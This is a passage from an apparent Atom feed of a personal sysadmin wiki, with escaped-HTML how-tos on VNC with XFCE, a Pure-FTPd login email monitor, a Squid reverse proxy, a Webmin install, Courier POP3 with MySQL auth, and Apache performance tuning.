&lt;span class="go"&gt;libtalloc2 libtheora0 libthunar-vfs-1-2 libtiff4 libusb-1.0-0&lt;/span&gt;
&lt;span class="go"&gt;libusbmuxd1 libvisual-0.4-0 libvisual-0.4-plugins libvorbis0a&lt;/span&gt;
&lt;span class="go"&gt;libvorbisenc2 libwbclient0 libwnck-common libwnck22 libx86-1&lt;/span&gt;
&lt;span class="go"&gt;libxcb-atom1 libxcb-aux0 libxcb-event1 libxcomposite1 libxfce4menu-0.1-0&lt;/span&gt;
&lt;span class="go"&gt;libxfce4util-bin libxfce4util-common libxfce4util4 libxfcegui4-4&lt;/span&gt;
&lt;span class="go"&gt;libxfconf-0-2 libxklavier16 libxres1 libxxf86misc1 miscfiles mtools&lt;/span&gt;
&lt;span class="go"&gt;notification-daemon ntfsprogs obex-data-server orage oss-compat pm-utils&lt;/span&gt;
&lt;span class="go"&gt;policykit-1 policykit-1-gnome psfontmgr python-dbus python-gobject&lt;/span&gt;
&lt;span class="go"&gt;radeontool shared-mime-info smartdimmer tango-icon-theme thunar&lt;/span&gt;
&lt;span class="go"&gt;thunar-data thunar-volman udisks usbmuxd vbetool xdg-user-dirs&lt;/span&gt;
&lt;span class="go"&gt;xfce-keyboard-shortcuts xfce4 xfce4-appfinder xfce4-mixer xfce4-panel&lt;/span&gt;
&lt;span class="go"&gt;xfce4-session xfce4-settings xfce4-utils xfconf xfdesktop4&lt;/span&gt;
&lt;span class="go"&gt;xfdesktop4-data xfwm4 xfwm4-themes xscreensaver xscreensaver-data&lt;/span&gt;
&lt;span class="go"&gt;0 upgraded, 172 newly installed, 0 to remove and 0 not upgraded.&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install vnc4server

&lt;span class="go"&gt;The following NEW packages will be installed:&lt;/span&gt;
&lt;span class="go"&gt;vnc4server xbase-clients&lt;/span&gt;
&lt;span class="go"&gt;0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; vncpasswd
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; ~/.vnc/xstartup
&lt;span class="gp"&gt;#&lt;/span&gt;!/bin/sh

&lt;span class="gp"&gt;#&lt;/span&gt; Uncomment the following two lines &lt;span class="k"&gt;for&lt;/span&gt; normal desktop:
&lt;span class="gp"&gt;#&lt;/span&gt; &lt;span class="nb"&gt;unset&lt;/span&gt; SESSION&lt;span class="se"&gt;\_&lt;/span&gt;MANAGER
&lt;span class="gp"&gt;#&lt;/span&gt; &lt;span class="nb"&gt;exec&lt;/span&gt; /etc/X11/xinit/xinitrc

&lt;span class="go"&gt;[ -x /etc/vnc/xstartup ] &amp;amp;&amp;amp; exec /etc/vnc/xstartup&lt;/span&gt;
&lt;span class="go"&gt;[ -r \$HOME/.Xresources ] &amp;amp;&amp;amp; xrdb \$HOME/.Xresources&lt;/span&gt;
&lt;span class="go"&gt;xsetroot -solid grey&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;vncconfig -iconic &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;x-terminal-emulator -geometry 80x24+10+10 -ls -title &lt;span class="s2"&gt;&amp;quot;\$VNCDESKTOP Desktop&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;x-window-manager &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;span class="go"&gt;startxfce4 &amp;amp;&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; vncserver :1 -geometry 1024x768 -depth &lt;span class="m"&gt;16&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; vncserver -kill :1  
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="ubuntu"></category><category term="x"></category><category term="xfce"></category><category term="gui"></category><category term="remote"></category><category term="vnc server"></category></entry><entry><title>Monitor Pure-FTPd User Access</title><link href="http://wiki.jokeru.ro/how-to-monitor-pure-ftpd-user-access.html" rel="alternate"></link><published>2011-05-18T01:10:00+01:00</published><updated>2011-05-18T01:10:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-05-18:/how-to-monitor-pure-ftpd-user-access.html</id><summary type="html">&lt;p&gt;Quick 'n dirty way to monitor your FTP server access:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /root/pure-ftpd-monitor.sh
&lt;span class="gp"&gt;#&lt;/span&gt;!/bin/bash

&lt;span class="go"&gt;to=&amp;#39;user@domain.com&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;log=&amp;#39;/var/log/messages&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;here=$(hostname)&lt;/span&gt;

&lt;span class="go"&gt;tail -f $log | while read -r line&lt;/span&gt;
&lt;span class="go"&gt;do&lt;/span&gt;
&lt;span class="gp"&gt; #&lt;/span&gt; sample log - &lt;span class="s2"&gt;&amp;quot;May 16 13:01:52 box pure-ftpd: (?@300.124.39.218) [INFO] jimmy …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Quick 'n dirty way to monitor your FTP server access:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /root/pure-ftpd-monitor.sh
&lt;span class="gp"&gt;#&lt;/span&gt;!/bin/bash

&lt;span class="go"&gt;to=&amp;#39;user@domain.com&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;log=&amp;#39;/var/log/messages&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;here=$(hostname)&lt;/span&gt;

&lt;span class="go"&gt;tail -f $log | while read -r line&lt;/span&gt;
&lt;span class="go"&gt;do&lt;/span&gt;
&lt;span class="gp"&gt; #&lt;/span&gt; sample log - &lt;span class="s2"&gt;&amp;quot;May 16 13:01:52 box pure-ftpd: (?@300.124.39.218) [INFO] jimmy is now logged in&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt; match=$(echo $line | grep &amp;#39;is now logged in&amp;#39; | grep -v &amp;#39;127.0.0.1&amp;#39;)&lt;/span&gt;
&lt;span class="go"&gt; if [ &amp;quot;$match&amp;quot; != &amp;quot;&amp;quot; ]&lt;/span&gt;
&lt;span class="go"&gt; then&lt;/span&gt;
&lt;span class="go"&gt;  Date=$(echo $line | awk &amp;#39;{print $1&amp;quot; &amp;quot;$2&amp;quot; &amp;quot;$3}&amp;#39;)&lt;/span&gt;
&lt;span class="go"&gt;  IP=$(echo $line | awk &amp;#39;{print $6}&amp;#39;)&lt;/span&gt;
&lt;span class="go"&gt;  User=$(echo $line | awk &amp;#39;{print $8}&amp;#39;)&lt;/span&gt;
&lt;span class="go"&gt;  echo &amp;quot;$Date - $IP / $User&amp;quot; | mail -s &amp;quot;$here - FTP Login&amp;quot; $to&lt;/span&gt;
&lt;span class="go"&gt; fi&lt;/span&gt;
&lt;span class="go"&gt;done&lt;/span&gt;
&lt;span class="go"&gt;EOF&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; chmod +x pure-ftpd-monitor.sh
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/root/pure-ftpd-monitor.sh&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /etc/rc.local
&lt;span class="gp"&gt;$&lt;/span&gt; /root/pure-ftpd-monitor.sh &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="centos"></category><category term="ubuntu"></category><category term="bash"></category><category term="ftp"></category><category term="pure-ftpd"></category></entry><entry><title>Squid as a Reverse Proxy (Website Accelerator)</title><link href="http://wiki.jokeru.ro/how-to-squid-as-a-reverse-proxy-website-accelerator.html" rel="alternate"></link><published>2011-05-03T15:15:00+01:00</published><updated>2011-05-03T15:15:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-05-03:/how-to-squid-as-a-reverse-proxy-website-accelerator.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; yum install squid

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/sysconfig/squid
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/squid/squid.conf
&lt;span class="gp"&gt;$&lt;/span&gt; service squid restart

&lt;span class="gp"&gt;$&lt;/span&gt; tail -f /var/log/squid/access.log &lt;span class="p"&gt;|&lt;/span&gt; perl -p -e &lt;span class="s1"&gt;&amp;#39;s/^([0-9]*)/&amp;quot;[&amp;quot;.localtime($1).&amp;quot;]&amp;quot;/e&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; squidclient -p &lt;span class="m"&gt;80&lt;/span&gt; -h &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40 -l &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 mgr:info

&lt;span class="gp"&gt;#&lt;/span&gt; Create swap directories
&lt;span class="gp"&gt;$&lt;/span&gt; service squid …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; yum install squid

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/sysconfig/squid
&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/squid/squid.conf
&lt;span class="gp"&gt;$&lt;/span&gt; service squid restart

&lt;span class="gp"&gt;$&lt;/span&gt; tail -f /var/log/squid/access.log &lt;span class="p"&gt;|&lt;/span&gt; perl -p -e &lt;span class="s1"&gt;&amp;#39;s/^([0-9]*)/&amp;quot;[&amp;quot;.localtime($1).&amp;quot;]&amp;quot;/e&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; squidclient -p &lt;span class="m"&gt;80&lt;/span&gt; -h &lt;span class="m"&gt;10&lt;/span&gt;.20.30.40 -l &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 mgr:info

&lt;span class="gp"&gt;#&lt;/span&gt; Create swap directories
&lt;span class="gp"&gt;$&lt;/span&gt; service squid stop&lt;span class="p"&gt;;&lt;/span&gt; squid -z&lt;span class="p"&gt;;&lt;/span&gt; service squid start
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;/etc/squid/squid.conf&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;http_port 10.20.30.40:80 accel defaultsite=jokeru.ro vhost&lt;/span&gt;
&lt;span class="go"&gt;forwarded_for on&lt;/span&gt;
&lt;span class="go"&gt;cache_peer 50.60.70.80 parent 80 0 no-query no-digest originserver login=PASS name=RealServer&lt;/span&gt;
&lt;span class="go"&gt;icp_port 0&lt;/span&gt;

&lt;span class="go"&gt;acl ALL src 0.0.0.0/0.0.0.0&lt;/span&gt;
&lt;span class="go"&gt;acl Manager proto cache_object&lt;/span&gt;
&lt;span class="go"&gt;acl LocalHost src 127.0.0.1/255.255.255.255&lt;/span&gt;
&lt;span class="go"&gt;acl JoKeru dstdomain jokeru.ro www.jokeru.ro&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; allow cachemgr access only from localhost
&lt;span class="go"&gt;http_access allow Manager LocalHost&lt;/span&gt;
&lt;span class="go"&gt;http_access deny Manager&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; allow everybody access to site
&lt;span class="go"&gt;http_access allow JoKeru&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; deny all not matching the above
&lt;span class="go"&gt;http_access deny ALL&lt;/span&gt;

&lt;span class="go"&gt;cache_peer_access RealServer allow JoKeru&lt;/span&gt;

&lt;span class="go"&gt;snmp_port 3401&lt;/span&gt;
&lt;span class="go"&gt;snmp_incoming_address 10.0.0.2&lt;/span&gt;
&lt;span class="go"&gt;acl CactiIP src 10.0.0.1/32&lt;/span&gt;
&lt;span class="go"&gt;acl CactiCom snmp_community secret&lt;/span&gt;
&lt;span class="go"&gt;snmp_access allow CactiIP CactiCom&lt;/span&gt;
&lt;span class="go"&gt;snmp_access deny ALL&lt;/span&gt;

&lt;span class="gp"&gt;#&lt;/span&gt; MEM Size - &lt;span class="m"&gt;256&lt;/span&gt; MB
&lt;span class="go"&gt;cache_mem 256 MB&lt;/span&gt;
&lt;span class="go"&gt;maximum_object_size_in_memory 32 KB&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; SWAP Size - &lt;span class="m"&gt;512&lt;/span&gt; MB
&lt;span class="go"&gt;cache_dir aufs /var/spool/squid 512 16 256&lt;/span&gt;
&lt;span class="go"&gt;maximum_object_size 4096 KB&lt;/span&gt;

&lt;span class="go"&gt;access_log /var/log/squid/access.log squid&lt;/span&gt;
&lt;span class="go"&gt;cache_mgr webmaster@jokeru.ro&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="apache"></category><category term="centos"></category><category term="proxy"></category><category term="squid"></category><category term="tunnel"></category></entry><entry><title>Webmin on CentOS</title><link href="http://wiki.jokeru.ro/how-to-webmin-on-centos.html" rel="alternate"></link><published>2011-04-15T12:48:00+01:00</published><updated>2011-04-15T12:48:00+01:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-04-15:/how-to-webmin-on-centos.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; wget http://heanet.dl.sourceforge.net/project/webadmin/webmin/1.590/webmin-1.590-1.noarch.rpm
&lt;span class="gp"&gt;$&lt;/span&gt; rpm -U webmin-1.590-1.noarch.rpm

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/webmin/miniserv.conf
&lt;span class="gp"&gt;#&lt;/span&gt; - &lt;span class="nv"&gt;listen&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10000&lt;/span&gt;  
&lt;span class="gp"&gt;#&lt;/span&gt; + &lt;span class="nv"&gt;bind&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.20.30.40

&lt;span class="gp"&gt;$&lt;/span&gt; /usr/libexec/webmin/changepass.pl /etc/webmin root webmin_pass

&lt;span class="gp"&gt;$&lt;/span&gt; service webmin restart
&lt;span class="gp"&gt;$&lt;/span&gt; chkconfig webmin on
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;theme -&amp;gt; http …&lt;/p&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; wget http://heanet.dl.sourceforge.net/project/webadmin/webmin/1.590/webmin-1.590-1.noarch.rpm
&lt;span class="gp"&gt;$&lt;/span&gt; rpm -U webmin-1.590-1.noarch.rpm

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/webmin/miniserv.conf
&lt;span class="gp"&gt;#&lt;/span&gt; - &lt;span class="nv"&gt;listen&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10000&lt;/span&gt;  
&lt;span class="gp"&gt;#&lt;/span&gt; + &lt;span class="nv"&gt;bind&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.20.30.40

&lt;span class="gp"&gt;$&lt;/span&gt; /usr/libexec/webmin/changepass.pl /etc/webmin root webmin_pass

&lt;span class="gp"&gt;$&lt;/span&gt; service webmin restart
&lt;span class="gp"&gt;$&lt;/span&gt; chkconfig webmin on
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;theme -&amp;gt; http://webmin-theme-stressfree.googlecode.com/files/theme-stressfree-2.10.tar.gz&lt;/p&gt;</content><category term="linux"></category><category term="centos"></category><category term="webmin"></category></entry><entry><title>Mail Server - Courier POP3/POP3-SSL</title><link href="http://wiki.jokeru.ro/how-to-mail-server-courier-pop3pop3-ssl.html" rel="alternate"></link><published>2011-03-03T18:40:00+00:00</published><updated>2011-03-03T18:40:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-03-03:/how-to-mail-server-courier-pop3pop3-ssl.html</id><summary type="html">&lt;p&gt;Configure Courier POP3 service using MySQL auth module.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install courier-authdaemon courier-authlib-mysql courier-pop courier-pop-ssl

&lt;span class="gp"&gt;$&lt;/span&gt; sed -i &lt;span class="s1"&gt;&amp;#39;s/authmodulelist=&amp;quot;authpam&amp;quot;/authmodulelist=&amp;quot;authmysql&amp;quot;/&amp;#39;&lt;/span&gt; /etc/courier/authdaemonrc
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /etc/courier/authmysqlrc
&lt;span class="go"&gt;MYSQL_SERVER localhost&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_USERNAME mail&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_PASSWORD xXxXx&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_PORT 0&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_OPT 0&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_DATABASE mail&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_USER_TABLE users&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_CRYPT_PWFIELD password&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;MYSQL_CLEAR_PWFIELD password
&lt;span class="go"&gt;MYSQL_UID_FIELD 5000&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_GID_FIELD …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Configure Courier POP3 service using MySQL auth module.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; apt-get install courier-authdaemon courier-authlib-mysql courier-pop courier-pop-ssl

&lt;span class="gp"&gt;$&lt;/span&gt; sed -i &lt;span class="s1"&gt;&amp;#39;s/authmodulelist=&amp;quot;authpam&amp;quot;/authmodulelist=&amp;quot;authmysql&amp;quot;/&amp;#39;&lt;/span&gt; /etc/courier/authdaemonrc
&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&amp;lt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt; &amp;gt; /etc/courier/authmysqlrc
&lt;span class="go"&gt;MYSQL_SERVER localhost&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_USERNAME mail&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_PASSWORD xXxXx&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_PORT 0&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_OPT 0&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_DATABASE mail&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_USER_TABLE users&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_CRYPT_PWFIELD password&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;MYSQL_CLEAR_PWFIELD password
&lt;span class="go"&gt;MYSQL_UID_FIELD 5000&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_GID_FIELD 5000&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_LOGIN_FIELD email&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_HOME_FIELD &amp;quot;/home/inbox&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;MYSQL_MAILDIR_FIELD&lt;/span&gt;
&lt;span class="go"&gt;CONCAT(SUBSTRING_INDEX(email,&amp;#39;@&amp;#39;,-1),&amp;#39;/&amp;#39;,SUBSTRING_INDEX(email,&amp;#39;@&amp;#39;,1),&amp;#39;/&amp;#39;)&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;MYSQL_NAME_FIELD
&lt;span class="gp"&gt;#&lt;/span&gt;MYSQL_QUOTA_FIELD quota
&lt;span class="go"&gt;EOF&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; vi /etc/courier/pop3d.cnf  
&lt;span class="gp"&gt;$&lt;/span&gt; rm -f /etc/courier/pop3d.pem  
&lt;span class="gp"&gt;$&lt;/span&gt; sed -i.bak &lt;span class="s1"&gt;&amp;#39;s/365/3650/&amp;#39;&lt;/span&gt; /usr/sbin/mkpop3dcert &lt;span class="c1"&gt;# 10 years validity  &lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; mkpop3dcert

&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/courier-authdaemon restart
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/courier-pop restart
&lt;span class="gp"&gt;$&lt;/span&gt; /etc/init.d/courier-pop-ssl restart

&lt;span class="gp"&gt;$&lt;/span&gt; telnet &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="m"&gt;110&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; openssl s_client -connect &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:995
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="mail"></category><category term="pop3"></category><category term="ssl"></category><category term="mysql"></category></entry><entry><title>Apache Performance Tunning</title><link href="http://wiki.jokeru.ro/how-to-apache-performance-tunning.html" rel="alternate"></link><published>2011-02-27T15:15:00+00:00</published><updated>2011-02-27T15:15:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-02-27:/how-to-apache-performance-tunning.html</id><summary type="html">&lt;p&gt;The single biggest issue affecting Apache webserver performance is RAM.
Have as much RAM as your hardware, OS, and funds allow. The more RAM your
system has, the more processes (and threads) Apache can allocate and use -
which directly translates into the amount of concurrent requests/clients
Apache can serve …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The single biggest issue affecting Apache webserver performance is RAM.
Have as much RAM as your hardware, OS, and funds allow. The more RAM your
system has, the more processes (and threads) Apache can allocate and use -
which directly translates into the amount of concurrent requests/clients
Apache can serve.&lt;/p&gt;
&lt;h3&gt;1. TimeOut&lt;/h3&gt;
&lt;p&gt;Lower the amount of time the server will wait before failing a request.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Timeout 15
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;2. KeepAlive&lt;/h3&gt;
&lt;p&gt;This directive allows multiple requests to be sent over the same TCP
connection. This is particularly useful while serving HTML pages with
lots of images. If KeepAlive is set to Off, then for each images, a
separate TCP connection has to be made. Overhead due to establishing
TCP connection can be eliminated by turning On KeepAlive.
&lt;code&gt;KeepAliveTimeout&lt;/code&gt; determines how long to wait for the next request.
&lt;code&gt;MaxKeepAliveRequests&lt;/code&gt; is the maximum number of requests to allow
during a persistent connection.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;KeepAlive On  
KeepAliveTimeout 3  
MaxKeepAliveRequests 50  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3. Process Creation - prefork MPM&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;ifmodule&lt;/span&gt; &lt;span class="err"&gt;mpm_prefork_module&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;  
StartServers 20  
MinSpareServers 10  
MaxSpareServers 20  
MaxClients 256  
MaxRequestsPerChild 5000  
&lt;span class="nt"&gt;&amp;lt;/ifmodule&amp;gt;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;MaxClients&lt;/code&gt; sets a limit on the number of simultaneous
connections/requests that will be served. Set this number too low and
resources will go to waste. Set this number too high and an influx of
connections will bring the server to a stand still. Set this number just
right and your server will fully utilize the available resources. An
approximation of this number should be derived by dividing the amount of
system memory (physical RAM) available by the maximum size of an
apache/httpd process (with a generous amount spared for all other
processes).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;MaxClients ≈ (RAM - size_all_other_processes) / (size_apache_process)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Get the value of apache process size in KiloBytes (RSS column):  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ps -ylC apache2 --sort:rss  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;StartServers&lt;/code&gt; directive sets the number of child server
processes created on startup. Apache will continue creating child
processes until the &lt;code&gt;MinSpareServers&lt;/code&gt; setting is reached. This doesn't
have much effect on performance if the server isn't restarted
frequently. If there are lot of requests and Apache is restarted
frequently, set this to a relatively high value.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;MaxSpareServers&lt;/code&gt; and &lt;code&gt;MinSpareServers&lt;/code&gt; determine how many child
processes to keep active while waiting for requests. If the
&lt;code&gt;MinSpareServers&lt;/code&gt; is too low and a bunch of requests come in, Apache will
have to spawn additional child processes to serve the requests. Creating
child processes is relatively expensive. If the server is busy creating
child processes, it won't be able to serve the client requests
immediately. &lt;code&gt;MaxSpareServers&lt;/code&gt; shouldn't be set too high: too many child
processes will consume resources unnecessarily. Tune &lt;code&gt;MinSpareServers&lt;/code&gt; and
&lt;code&gt;MaxSpareServers&lt;/code&gt; so that Apache need not spawn more than 4 child
processes per second (Apache can spawn a maximum of 32 child processes
per second). When more than 4 children are spawned per second, a message
will be logged in the ErrorLog.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;MaxRequestsPerChild&lt;/code&gt; directive sets the limit on the number of
requests that an individual child server process will handle. After
&lt;code&gt;MaxRequestsPerChild&lt;/code&gt; requests, the child process will die. It's set to 0
by default, the child process will never expire. It is appropriate to
set this to a value of few thousands. This can help prevent memory
leakage, since the process dies after serving a certain number of
requests. Don't set this too low, since creating new processes does have
overhead. The goal here is to recycle each process once per day, as
apache threads gradually increase their memory allocation as they run.&lt;/p&gt;
&lt;h3&gt;4. SymLinks&lt;/h3&gt;
&lt;p&gt;Make sure &lt;code&gt;Options +FollowSymLinks -SymLinksIfOwnerMatch&lt;/code&gt; is set for all
directories. Otherwise, Apache will issue an extra system call per
filename component to substantiate that the filename is NOT a symlink,
and more system calls to match an owner.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;directory&lt;/span&gt; &lt;span class="err"&gt;xxx&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
 Options FollowSymLinks
&lt;span class="nt"&gt;&amp;lt;/directory&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;5. AllowOverride&lt;/h3&gt;
&lt;p&gt;Set a default &lt;code&gt;AllowOverride None&lt;/code&gt; for your filesystem. Otherwise, for
a given URL to path translation, Apache will attempt to detect an
.htaccess file under every directory level of the given path.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;directory&lt;/span&gt; &lt;span class="err"&gt;xxx&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
 AllowOverride None
&lt;span class="nt"&gt;&amp;lt;/directory&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;source: &lt;a href="http://linuxgazette.net/123/vishnu.html"&gt;http://linuxgazette.net/123/vishnu.html&lt;/a&gt;
source: &lt;a href="http://httpd.apache.org/docs/2.0/misc/perf-tuning.html"&gt;http://httpd.apache.org/docs/2.0/misc/perf-tuning.html&lt;/a&gt;
source: &lt;a href="http://www.devside.net/articles/apache-performance-tuning"&gt;http://www.devside.net/articles/apache-performance-tuning&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</content><category term="linux"></category><category term="apache"></category><category term="performance"></category><category term="tuning"></category></entry><entry><title>Custom Color BASH Prompt</title><link href="http://wiki.jokeru.ro/how-to-custom-color-bash-prompt.html" rel="alternate"></link><published>2011-02-24T19:15:00+00:00</published><updated>2011-02-24T19:15:00+00:00</updated><author><name>jokeru</name></author><id>tag:wiki.jokeru.ro,2011-02-24:/how-to-custom-color-bash-prompt.html</id><summary type="html">&lt;h3&gt;just&lt;/h3&gt;
